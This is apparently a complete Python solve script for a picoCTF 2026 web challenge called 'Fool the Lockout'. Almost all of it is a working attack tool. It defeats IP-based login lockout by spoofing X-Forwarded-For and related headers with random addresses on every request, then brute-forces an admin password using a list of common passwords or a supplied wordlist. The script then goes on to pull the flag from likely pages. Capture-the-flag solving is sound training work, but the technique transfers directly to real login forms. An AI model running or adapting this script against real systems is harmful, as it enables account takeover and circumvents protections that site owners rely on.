#!/usr/bin/env python3
"""
Fool the Lockout - picoCTF 2026
Category: Web Exploitation | Points: 200

Bypasses IP-based rate limiting on a login form by spoofing the
X-Forwarded-For header with a unique IP on each request, then brute-forces
the password.

Requirements:
    pip install requests

Usage:
    python3 solve.py

    Set the following environment variables (or edit the defaults below):
        TARGET_URL   - The challenge URL (e.g., http://host:port)
        USERNAME     - The username to brute-force (default: admin)
        WORDLIST     - Path to a password wordlist (optional)
"""

import os
import sys
import random
import string
import time

try:
    import requests
except ImportError:
    print("[!] Missing dependency. Install with: pip install requests")
    sys.exit(1)

# ─── Configuration ───────────────────────────────────────────────────────────
TARGET_URL = os.getenv("TARGET_URL", "http://challenge-host:port")
USERNAME   = os.getenv("USERNAME", "admin")
WORDLIST   = os.getenv("WORDLIST", "")

LOGIN_PATH = "/login"  # Adjust if the login endpoint differs

# Common passwords to try if no wordlist is provided
DEFAULT_PASSWORDS = [
    "password", "123456", "admin", "letmein", "welcome",
    "monkey", "dragon", "master", "qwerty", "login",
    "abc123", "password1", "1234567890", "password123",
    "iloveyou", "sunshine", "princess", "football", "charlie",
    "shadow", "michael", "trustno1", "batman", "access",
    "hello", "freedom", "whatever", "654321", "jordan",
    "jennifer", "harley", "ranger", "buster", "soccer",
    "hockey", "george", "andrew", "pepper", "joshua",
    "starwars", "thomas", "summer", "ginger", "ashley",
    "test", "pass", "root", "toor", "guest",
    "info", "mysql", "user", "administrator", "oracle",
    "secret", "super", "p@ssw0rd", "changeme",
]


def random_ip():
    """Generate a random IP address for X-Forwarded-For spoofing."""
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def load_wordlist(path):
    """Load passwords from a wordlist file."""
    passwords = []
    try:
        with open(path, "r", errors="ignore") as f:
            for line in f:
                pw = line.strip()
                if pw:
                    passwords.append(pw)
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {path}")
        sys.exit(1)
    return passwords


def try_login(session, url, username, password, spoofed_ip):
    """
    Attempt a login with a spoofed X-Forwarded-For header.
    Returns the response object.
    """
    headers = {
        "X-Forwarded-For": spoofed_ip,
        "X-Real-IP": spoofed_ip,               # Some servers check this too
        "X-Originating-IP": spoofed_ip,         # Additional header variant
        "X-Client-IP": spoofed_ip,              # Another common variant
    }

    # Try both form-encoded and JSON payloads
    data = {
        "username": username,
        "password": password,
    }

    try:
        resp = session.post(url, data=data, headers=headers, allow_redirects=False, timeout=10)
        return resp
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
        return None


def is_success(resp):
    """
    Determine if a login attempt was successful.
    Checks for common success indicators.
    """
    if resp is None:
        return False

    # Check for redirect (302/303) to a dashboard/flag page
    if resp.status_code in (301, 302, 303):
        location = resp.headers.get("Location", "")
        if "flag" in location.lower() or "dashboard" in location.lower() or "success" in location.lower():
            return True

    body = resp.text.lower()

    # Check for flag in response
    if "picoctf{" in body:
        return True

    # Check for success indicators
    success_indicators = ["welcome", "success", "logged in", "flag", "dashboard"]
    failure_indicators = ["invalid", "incorrect", "wrong", "failed", "error", "locked", "too many", "rate limit"]

    has_success = any(ind in body for ind in success_indicators)
    has_failure = any(ind in body for ind in failure_indicators)

    if has_success and not has_failure:
        return True

    return False


def extract_flag(resp):
    """Try to extract a picoCTF flag from the response."""
    import re
    if resp is None:
        return None
    match = re.search(r'picoCTF\{[^}]+\}', resp.text)
    if match:
        return match.group(0)

    # If redirected, follow the redirect and check that page
    if resp.status_code in (301, 302, 303):
        location = resp.headers.get("Location", "")
        if location:
            if not location.startswith("http"):
                base = TARGET_URL.rstrip("/")
                location = base + "/" + location.lstrip("/")
            try:
                follow = requests.get(location, headers={"X-Forwarded-For": random_ip()}, timeout=10)
                match = re.search(r'picoCTF\{[^}]+\}', follow.text)
                if match:
                    return match.group(0)
            except Exception:
                pass
    return None


def main():
    print("[*] Fool the Lockout - picoCTF 2026 Exploit")
    print("=" * 50)

    login_url = TARGET_URL.rstrip("/") + LOGIN_PATH
    print(f"[+] Target: {login_url}")
    print(f"[+] Username: {USERNAME}")

    # Load passwords
    if WORDLIST:
        print(f"[+] Loading wordlist: {WORDLIST}")
        passwords = load_wordlist(WORDLIST)
    else:
        print(f"[+] Using built-in password list ({len(DEFAULT_PASSWORDS)} passwords)")
        passwords = DEFAULT_PASSWORDS

    print(f"[+] Total passwords to try: {len(passwords)}")
    print(f"[+] Bypassing rate limit via X-Forwarded-For header spoofing\n")

    session = requests.Session()
    found = False

    for i, password in enumerate(passwords, 1):
        spoofed_ip = random_ip()
        resp = try_login(session, login_url, USERNAME, password, spoofed_ip)

        if resp is None:
            print(f"  [{i}/{len(passwords)}] {password:<20} -> CONNECTION ERROR")
            time.sleep(1)
            continue

        status = resp.status_code
        # Truncate response for display
        snippet = resp.text[:80].replace("\n", " ").strip()

        if is_success(resp):
            print(f"  [{i}/{len(passwords)}] {password:<20} -> HTTP {status} [SUCCESS!]")
            print(f"\n[+] Valid credentials found: {USERNAME}:{password}")

            flag = extract_flag(resp)
            if flag:
                print(f"[+] FLAG: {flag}")
            else:
                print("[*] Flag not in immediate response. Trying to follow redirects...")
                # Try accessing the page after login
                for path in ["/flag", "/dashboard", "/home", "/", "/flag.txt"]:
                    try:
                        r = session.get(
                            TARGET_URL.rstrip("/") + path,
                            headers={"X-Forwarded-For": random_ip()},
                            timeout=10,
                        )
                        flag = extract_flag(r)
                        if flag:
                            print(f"[+] FLAG found at {path}: {flag}")
                            break
                    except Exception:
                        continue

                if not flag:
                    print("[*] Could not auto-extract flag. Log in manually with the found credentials.")
                    print(f"[*] Full response:\n{resp.text[:500]}")

            found = True
            break
        else:
            # Show progress every attempt
            if "locked" in resp.text.lower() or "rate" in resp.text.lower() or "too many" in resp.text.lower():
                print(f"  [{i}/{len(passwords)}] {password:<20} -> HTTP {status} [RATE LIMITED - header bypass may have failed]")
            else:
                print(f"  [{i}/{len(passwords)}] {password:<20} -> HTTP {status} [Wrong]")

    if not found:
        print(f"\n[-] Password not found in the wordlist.")
        print("[*] Try a larger wordlist (e.g., rockyou.txt) with:")
        print(f'    WORDLIST=/path/to/rockyou.txt python3 {sys.argv[0]}')


if __name__ == "__main__":
    main()
